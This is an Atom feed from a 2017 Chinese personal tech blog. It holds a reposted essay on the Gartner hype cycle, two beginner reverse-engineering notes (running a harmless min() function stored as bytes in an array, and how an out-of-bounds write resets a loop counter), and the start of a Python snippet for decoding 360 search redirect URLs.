<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Akkuman Blog</title>
  <subtitle>Python &amp; Hacker</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://akkuman.coding.me/"/>
  <updated>2017-03-12T05:44:27.345Z</updated>
  <id>http://akkuman.coding.me/</id>
  
  <author>
    <name>Akkuman</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>技术的热门度曲线</title>
    <link href="http://akkuman.coding.me/2017/03/12/technology-s-popularity-curve.html"/>
    <id>http://akkuman.coding.me/2017/03/12/technology-s-popularity-curve.html</id>
    <published>2017-03-12T05:34:01.000Z</published>
    <updated>2017-03-12T05:44:27.345Z</updated>
    
    <content type="html"><![CDATA[<p>全球最大的 IT 咨询公司<a href="http://baike.baidu.com/item/Gartner" target="_blank" rel="external">高德纳</a>（Gartner），有一个”<a href="http://www.gartner.com/technology/research/methodologies/hype-cycle.jsp" target="_blank" rel="external">技术热门度曲线</a>“模型（Gartner Hype Cycle）。</p>
<p>该模型认为，一门技术的发展要经历五个阶段。</p>
<p><img src="https://ooo.0o0.ooo/2017/03/12/58c4de8267e76.png" alt="bg2017030301.png"><br><a id="more"></a></p>
<ol>
<li><p><strong>启动期（Innovation Trigger）</strong><br>该技术刚刚诞生，还只是一个概念，不具有可用性，无法评估商业潜力。媒体有所报道，引起了外界的兴趣。</p>
</li>
<li><p><strong>泡沫期（Peak of Inflated Expectations）</strong><br>该技术逐步成型，出现了个别成功的案例，一些激进的公司开始跟进。媒体开始大肆报导，伴有各种非理性的渲染，产品的知名度达到高峰。</p>
</li>
<li><p><strong>低谷期（Trough of Disillusionment）</strong><br>该技术的局限和缺点逐步暴露，对它的兴趣开始减弱。基于它的产品，大部分被市场淘汰或者失败，只有那些找到早期用户的公司艰难地活了下来。媒体对它的报道逐步冷却，前景不明。</p>
</li>
<li><p><strong>爬升期（Slope of Enlightenment）</strong><br>该技术的优缺点越来越明显，细节逐渐清晰，越来越多的人开始理解它。基于它的第二代和第三代产品出现，更多的企业开始尝试，可复制的成功使用模式出现。媒体重新认识它，业界这一次给予了高度的理性的关注。</p>
</li>
<li><p><strong>高原期（Plateau of Productivity）</strong><br>经过不断发展，该技术慢慢成为了主流。技术标准得到了清晰定义，使用起来越发方便好用，市场占有率越来越高，进入稳定应用阶段。配合它的工具和最佳实践，经过数代的演进，也变得非常成熟了。业界对它有了公认的一致的评价。</p>
</li>
</ol>
<p>该模型的细节可以查看维基百科的<a href="https://en.wikipedia.org/wiki/Hype_cycle#/media/File:Hype-Cycle-General.png" target="_blank" rel="external">大图</a>。</p>
<p>高德纳公司每年都会公布，当年的热门技术图。下面就是去年七月的图。</p>
<p><img src="https://ooo.0o0.ooo/2017/03/12/58c4df3436d4e.png" alt="bg2017030302.png"></p>
<p>上图中，4D打印处于”启动期”，区块链处于”泡沫期”，增强现实处于”低谷期”，虚拟现实处于爬升期。</p>
<p>本周，有人进行数据分析后，建立了一个名叫 <a href="https://stateofdev.com/" target="_blank" rel="external">State.of.Dev</a> 的网站，提供各种技术的热门程度图。</p>
<p>下图是编程语言。</p>
<p><img src="https://ooo.0o0.ooo/2017/03/12/58c4df61bd060.png" alt="bg2017030303.png"></p>
<p>上图中，Rust 语言处于启动期，Go 语言处于泡沫期，Ruby 语言处于低谷期，Object-C 处于爬升期，PHP 和 Java 处于高原期。</p>
<p>下图是 Web 技术。</p>
<p><img src="https://ooo.0o0.ooo/2017/03/12/58c4df7a78ea1.png" alt="bg2017030305.png"></p>
<p>上图中，WebAssembly 处于启动期，WebRTC 处于低谷期，HTTPS 处于高原期。</p>
<p>一门技术到底前景如何，很难预测，但是它的热门程度却是可以衡量的（比如在社交媒体提及次数的增长幅度）。风险投资跟热门程度高度正相关，越热门的技术越容易拿到投资。</p>
<p>用户可以采用这张图，判断技术处在哪一个阶段，确定它的热门程度。简单的使用规则如下。</p>
<blockquote>
<p><strong>“争取风险投资，要选择热门的技术；解决实际问题， 要选择可靠的技术。”</strong></p>
</blockquote>
<p>简单说，处于启动期的技术，风险很大，不确定性极高，但是一旦成功，回报可能也很高，适合创业公司；处于高原期的技术，非常可靠，风险低，有成熟的解决方案和配套工具，适合大公司和企业的内部应用。</p>
<p>反过来说，如果一门技术处于高原期了，就代表它非常成熟了，人们对它能干什么和不能干什么，都已经很了解了，也没有新的期待了，技术本身的潜力已经不大了，所以用它拿不到投资，只能用来干活。</p>
<p>（完）</p>
<p><strong>转载自<a href="http://www.ruanyifeng.com/blog/2017/03/gartner-hype-cycle.html" target="_blank" rel="external">阮一峰的网络日志</a></strong></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;全球最大的 IT 咨询公司&lt;a href=&quot;http://baike.baidu.com/item/Gartner&quot;&gt;高德纳&lt;/a&gt;（Gartner），有一个”&lt;a href=&quot;http://www.gartner.com/technology/research/methodologies/hype-cycle.jsp&quot;&gt;技术热门度曲线&lt;/a&gt;“模型（Gartner Hype Cycle）。&lt;/p&gt;
&lt;p&gt;该模型认为，一门技术的发展要经历五个阶段。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://ooo.0o0.ooo/2017/03/12/58c4de8267e76.png&quot; alt=&quot;bg2017030301.png&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="life" scheme="http://akkuman.coding.me/categories/life/"/>
    
    
      <category term="life" scheme="http://akkuman.coding.me/tags/life/"/>
    
  </entry>
  
  <entry>
    <title>逆向学习笔记（2）-这是代码还是数据</title>
    <link href="http://akkuman.coding.me/2017/03/10/reverse-engineering-study-note-2-is-this-code-or-data.html"/>
    <id>http://akkuman.coding.me/2017/03/10/reverse-engineering-study-note-2-is-this-code-or-data.html</id>
    <published>2017-03-10T15:38:22.000Z</published>
    <updated>2017-03-10T15:56:28.723Z</updated>
    
    <content type="html"><![CDATA[<p><strong>以下的ide为CodeBlocks，编译器采用的GCC，系统为win10 64bit,在不同编译器和环境下汇编代码可能不同</strong><br><a id="more"></a></p>
<h1 id="现象"><a href="#现象" class="headerlink" title="现象"></a>现象</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">getmin</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">if</span>(a&gt;b)</div><div class="line">		<span class="keyword">return</span> b;</div><div class="line">	<span class="keyword">else</span></div><div class="line">		<span class="keyword">return</span> a;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*pfunction)</span><span class="params">(<span class="keyword">int</span>, <span class="keyword">int</span>)</span></span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> a=<span class="number">456789</span>,b=<span class="number">123789</span>,c=<span class="number">0</span>;</div><div class="line">    pfunction pGetmin = (pfunction)getmin;</div><div class="line">	</div><div class="line">    c = pGetmin(a, b);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,c);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>上面这段代码是比大小输出小的，<code>typedef int (*pfunction)(int, int);</code>定义了一个函数指针，但是下面这段代码和上面的功能是完全一样的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*pfunction)</span><span class="params">(<span class="keyword">int</span>, <span class="keyword">int</span>)</span></span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> a=<span class="number">456789</span>,b=<span class="number">123789</span>,c=<span class="number">0</span>;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> loc[] =</div><div class="line">    &#123;</div><div class="line">        <span class="number">0x55</span>, <span class="number">0x89</span>, <span class="number">0xE5</span>, <span class="number">0x8B</span>, <span class="number">0x45</span>, <span class="number">0x08</span>, <span class="number">0x3B</span>, <span class="number">0x45</span>, <span class="number">0x0C</span>, <span class="number">0x7E</span>, <span class="number">0x05</span>, <span class="number">0x8B</span>, <span class="number">0x45</span>, <span class="number">0x0C</span>, <span class="number">0xEB</span>, <span class="number">0x03</span>, <span class="number">0x8B</span>, <span class="number">0x45</span>, <span class="number">0x08</span>, <span class="number">0x5D</span>, <span class="number">0xC3</span></div><div class="line">    &#125;;</div><div class="line"></div><div class="line">    pfunction getmin = (pfunction)&amp;loc;</div><div class="line">    c = getmin(a, b);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,c);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h1 id="原因分析"><a href="#原因分析" class="headerlink" title="原因分析"></a>原因分析</h1><p>当<code>c = pGetmin(a, b);</code>调用pGetmin的时候，在汇编中是先call跳到一个地址然后从那个地址再jmp到函数入口地址然后开始执行函数<br>getmin函数整体汇编为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">push   ebp</div><div class="line">mov    ebp,esp</div><div class="line">mov    eax,DWORD PTR [ebp+0x8]</div><div class="line">cmp    eax,DWORD PTR [ebp+0xc]</div><div class="line">jle    &lt;getmin+16&gt;</div><div class="line">mov    eax,DWORD PTR [ebp+0xc]</div><div class="line">jmp    &lt;getmin+19&gt;</div><div class="line">mov    eax,DWORD PTR [ebp+0x8]</div><div class="line">pop    ebp</div><div class="line">ret</div></pre></td></tr></table></figure></p>
<p>通过一些调试程序（发现CodeBlocks带的汇编调试没有vc6好用，看不到硬编码）可以得出这段汇编代码在硬编码中的值为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">0x55, 0x89, 0xE5, 0x8B, 0x45, 0x08, 0x3B, 0x45, 0x0C, 0x7E, 0x05, 0x8B, 0x45, 0x0C, 0xEB, 0x03, 0x8B, 0x45, 0x08, 0x5D, 0xC3</div></pre></td></tr></table></figure></p>
<p>这段数据我们在第二个代码中把它存入了一个char类型的数组，它虽然在数据区，但是它还是可以看作可运行的一段函数代码，我们依旧定义一个函数指针指向这个char类型数组的入口地址，达到了和第一种相同的效果<br>在编程中，我们是把代码和数据分得很开的，但是在逆向和汇编中，这个区别就不明显了，在计算机中都是以数据形式存在的，你可以说它是一串数据，也可以说它是代码</p>
<p><strong><em>转载请注明出处</em></strong></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;以下的ide为CodeBlocks，编译器采用的GCC，系统为win10 64bit,在不同编译器和环境下汇编代码可能不同&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="逆向" scheme="http://akkuman.coding.me/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向" scheme="http://akkuman.coding.me/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>逆向学习笔记（1）-为什么代码不停地循环运行</title>
    <link href="http://akkuman.coding.me/2017/03/09/reverse-engineering-study-note-1-why-does-code-keep-running.html"/>
    <id>http://akkuman.coding.me/2017/03/09/reverse-engineering-study-note-1-why-does-code-keep-running.html</id>
    <published>2017-03-09T08:33:07.000Z</published>
    <updated>2017-03-09T09:45:45.162Z</updated>
    
    <content type="html"><![CDATA[<p>对于下面这段c语言代码会一直不停地循环，为什么呢？</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">HelloWorld</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</div><div class="line">	<span class="keyword">int</span> a[] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>&#125;;</div><div class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;=<span class="number">10</span>; i++)</div><div class="line">	&#123;</div><div class="line">		a[i] = <span class="number">0</span>;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"Hello World!\n"</span>);</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></div><div class="line">&#123;</div><div class="line">	HelloWorld();</div><div class="line">	getchar();</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p>当你运行上面这串代码的时候，因为c语言并不会对数组越界进行检查，所以是不会报错可以直接运行的，那么是什么原因导致了下面这张图的结果呢？</p>
<p><img src="https://ooo.0o0.ooo/2017/03/09/58c11551a36ea.gif" alt="GIF.gif"></p>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>我们可以调试跟进看看，在HelloWorld函数上加一个断点跟进去看看</p>
<p><img src="https://ooo.0o0.ooo/2017/03/09/58c11956dee36.png" alt="snipaste_20170309_165830.png"></p>
<p>这个函数主要的汇编代码如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">8:        int i = 0;</div><div class="line">00401038   mov         dword ptr [ebp-4],0</div><div class="line">9:        int a[] = &#123;1,2,3,4,5,6,7,8,9,10&#125;;</div><div class="line">0040103F   mov         dword ptr [ebp-2Ch],1</div><div class="line">00401046   mov         dword ptr [ebp-28h],2</div><div class="line">0040104D   mov         dword ptr [ebp-24h],3</div><div class="line">00401054   mov         dword ptr [ebp-20h],4</div><div class="line">0040105B   mov         dword ptr [ebp-1Ch],5</div><div class="line">00401062   mov         dword ptr [ebp-18h],6</div><div class="line">00401069   mov         dword ptr [ebp-14h],7</div><div class="line">00401070   mov         dword ptr [ebp-10h],8</div><div class="line">00401077   mov         dword ptr [ebp-0Ch],9</div><div class="line">0040107E   mov         dword ptr [ebp-8],0Ah</div><div class="line">10:       for(i=0; i&lt;=10; i++)</div><div class="line">00401085   mov         dword ptr [ebp-4],0</div><div class="line">0040108C   jmp         HelloWorld+77h (00401097)</div><div class="line">0040108E   mov         eax,dword ptr [ebp-4]</div><div class="line">00401091   add         eax,1</div><div class="line">00401094   mov         dword ptr [ebp-4],eax</div><div class="line">00401097   cmp         dword ptr [ebp-4],0Ah</div><div class="line">0040109B   jg          HelloWorld+97h (004010b7)</div><div class="line">11:       &#123;</div><div class="line">12:           a[i] = 0;</div><div class="line">0040109D   mov         ecx,dword ptr [ebp-4]</div><div class="line">004010A0   mov         dword ptr [ebp+ecx*4-2Ch],0</div><div class="line">13:           printf(&quot;Hello World!\n&quot;);</div><div class="line">004010A8   push        offset string &quot;Hello World!\n&quot; (0042301c)</div><div class="line">004010AD   call        printf (004011a0)</div><div class="line">004010B2   add         esp,4</div><div class="line">14:       &#125;</div><div class="line">004010B5   jmp         HelloWorld+6Eh (0040108e)</div><div class="line">15:   &#125;</div></pre></td></tr></table></figure></p>
<p>从<code>int i = 0;</code>开始看直到<code>for(i=0; i&lt;=10; i++)</code>的堆栈图是</p>
<p><img src="https://ooo.0o0.ooo/2017/03/09/58c11ad728904.png" alt="snipaste_20170309_170508.png"></p>
<p>第一次进入循环开始先把0放到了[ebp-4]，然后跳到了<code>00401097   cmp dword ptr [ebp-4],0Ah</code>以及下面的jg，这里的意思是如果ebp-4中存放的值比0A大那么就执行<code>jg HelloWorld+97h (004010b7)</code>跳到004010b7函数结束<br>第一次进入循环时，cmp之后（ebp-4中存放的值比0A小）执行<code>0040109D</code>处的语句，此时<code>ECX</code>中的值变成了[ebp-4]中的值也就是0，然后<code>mov dword ptr [ebp+ecx*4-2Ch],0</code>将0放到<code>ebp+ecx*4-2Ch</code>处也就是<code>EBP-2C</code>处，下面的两条语句不用管是执行输出的，然后到了<code>add  esp,4</code>将栈顶的值加4，这里我们无需关注栈顶，然后<code>jmp HelloWorld+6Eh (0040108e)</code>跳回到<code>0040108e</code>继续执行</p>
<p><img src="https://ooo.0o0.ooo/2017/03/09/58c11e41e5384.png" alt="snipaste_20170309_170508.png"></p>
<p>跳到<code>0040108E   mov  eax,dword ptr [ebp-4]</code>开始执行，紧接着这三条语句的作用是把<code>EBP-4</code>中的值加了1，也就是<code>EBP-4</code>中的值现在为1<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">mov eax,dword ptr [ebp-4]</div><div class="line">add eax,1</div><div class="line">mov dword ptr [ebp-4],eax</div></pre></td></tr></table></figure></p>
<p>cmp比较之后再次执行循环体，循环体完成后再次跳到<code>0040108e</code>，此时<code>EBP-28</code>的值变为了0，栈顶esp再次增加了4（这个例子中栈顶是不用关注的）</p>
<p><img src="https://ooo.0o0.ooo/2017/03/09/58c11fe590ae4.png" alt="snipaste_20170309_172648.png"></p>
<p>紧接着下次执行后</p>
<p><img src="https://ooo.0o0.ooo/2017/03/09/58c1202d748a0.png" alt="snipaste_20170309_172805.png"></p>
<p>直到这个数组长度为10的数组执行到第十次</p>
<p><img src="https://ooo.0o0.ooo/2017/03/09/58c120f1a650e.png" alt="snipaste_20170309_173122.png"></p>
<p>此时再次跳转到<code>0040108e</code>，然后<code>EBP-4</code>中的值再次增加了1，现在也就是<code>EBP-4</code>中的值变为了0A，cmp比较之后<code>EBP-4</code>中的值依旧不比0A大，接着执行<code>mov ecx,dword ptr [ebp-4]</code>，此时ECX的值变成了0A，接着执行<code>mov dword ptr [ebp+ecx*4-2Ch],0</code>也就是<code>mov dword ptr [ebp-4],0</code></p>
<p>然后呢，你发现了什么？？？就是他喵的<code>EBP-4</code>中的值变成了0</p>
<p><img src="https://ooo.0o0.ooo/2017/03/09/58c12263d566e.png" alt="snipaste_20170309_173729.png"></p>
<p>变成0代表着什么？？？<code>EBP-4</code>中的值是我们拿来干嘛的？是用来和0A进行cmp然后决定是否结束函数的，可是我们辛辛苦苦循环了10次，第11次全泡汤了，唯一的变化就是数组都成了0，栈顶的值变化了不少，然后再次cmp的时候，0和0A比，决定了你还是要循环，不管多少次，最后都会把你用来计数的地址<code>EBP-4</code>中的值清零</p>
<p>这也就是为什么上面这段c语言代码会一直不停地循环的原因</p>
<p><strong>转载请注明出处</strong></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;对于下面这段c语言代码会一直不停地循环，为什么呢？&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;meta-string&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;HelloWorld&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; a[] = &amp;#123;&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;6&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;7&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;9&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;10&lt;/span&gt;&amp;#125;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(i=&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i&amp;lt;=&lt;span class=&quot;number&quot;&gt;10&lt;/span&gt;; i++)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		a[i] = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		&lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;Hello World!\n&quot;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; argc, &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt;* argv[])&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	HelloWorld();&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	getchar();&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="逆向" scheme="http://akkuman.coding.me/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向" scheme="http://akkuman.coding.me/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>360搜索引擎取真实地址-python代码</title>
    <link href="http://akkuman.coding.me/2017/03/08/360-Search-Engine-get-realURL-with-python.html"/>
    <id>http://akkuman.coding.me/2017/03/08/360-Search-Engine-get-realURL-with-python.html</id>
    <published>2017-03-08T13:12:59.000Z</published>
    <updated>2017-03-08T13:46:42.978Z</updated>
    
    <content type="html"><![CDATA[<p>还是个比较简单的，不像百度有加密算法</p>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.so.com/link?url=http%3A%2F%2Fedu.sd.chinamobile.com%2Findex%2Fnews.do%3Faction%3DnoticeDetail%26id%3D22452&amp;q=inurl%3Anews.do&amp;ts=1488978912&amp;t=89c5361a44fe3f52931d25c6de262bb&amp;src=haosou</div></pre></td></tr></table></figure>
<p>网址是上面这个样子，没加密直接取就好了，去掉头<code>http://www.so.com/link?url=</code>和尾<code>&amp;q=</code>一直到末尾的部分，剩下的就可以吃了<br><a id="more"></a><br>那么规则我们就可以写出来了<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">a[<span class="string">'href'</span>][a[<span class="string">'href'</span>].index(<span class="string">'?url='</span>):a[<span class="string">'href'</span>].index(<span class="string">'&amp;q='</span>)][<span class="number">5</span>:]</div></pre></td></tr></table></figure></p>
<p><code>a[&#39;href&#39;]</code>是待处理网址,<code>a[&#39;href&#39;].index(&#39;?url=&#39;):a[&#39;href&#39;].index(&#39;&amp;q=&#39;)</code>的部分为<code>?url=http%3A%2F%2Fedu.sd.chinamobile.com%2Findex%2Fnews.do%3Faction%3DnoticeDetail%26id%3D22452</code></p>
<p>最后还需要用unquote解码</p>
<ul>
<li>在python3中是<code>urllib.parse.unquote</code></li>
<li>在python2中是<code>urllib.unquote</code></li>
</ul>
<h1 id="code"><a href="#code" class="headerlink" title="code"></a>code</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</div><div class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</div><div class="line"></div><div class="line">headers = &#123;</div><div class="line">    <span class="string">"User-Agent"</span> : <span class="string">"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0"</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span 